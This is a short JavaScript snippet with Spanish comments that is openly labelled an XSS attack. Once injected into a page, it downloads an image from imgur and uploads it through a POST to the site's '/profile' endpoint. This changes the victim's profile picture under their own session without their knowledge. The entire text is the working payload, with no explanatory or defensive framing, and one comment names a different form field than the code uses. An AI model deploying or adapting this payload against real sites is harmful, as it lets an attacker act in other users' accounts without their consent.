// Usamos la URL exacta de la imagen que ya está en el servidor.
const imageUrl = 'https://i.imgur.com/ALcFLac.png';

async function changeProfilePic() {
  try {
    // 1. Obtenemos la imagen del servidor y la convertimos en un Blob.
    const response = await fetch(imageUrl);
    const imageBlob = await response.blob();

    // 2. Creamos el objeto FormData.
    const formData = new FormData();

    // 3. Añadimos el Blob al FormData.
    // ¡¡IMPORTANTE!! Reemplaza 'profile_image' con el nombre del campo que encontraste.
    // El tercer argumento es el nombre del archivo que "finge" ser, puede ser cualquiera.
    formData.append('profile_pic', imageBlob, 'xss.jpg');

    // 4. Enviamos la petición POST al perfil.
    await fetch('/profile', {
      method: 'POST',
      body: formData,
    });

    console.log('Ataque XSS ejecutado. La foto de perfil debería haber cambiado.');

  } catch (error) {
    console.error('Falló el ataque XSS:', error);
  }
}

// Ejecutamos la función.
changeProfilePic();
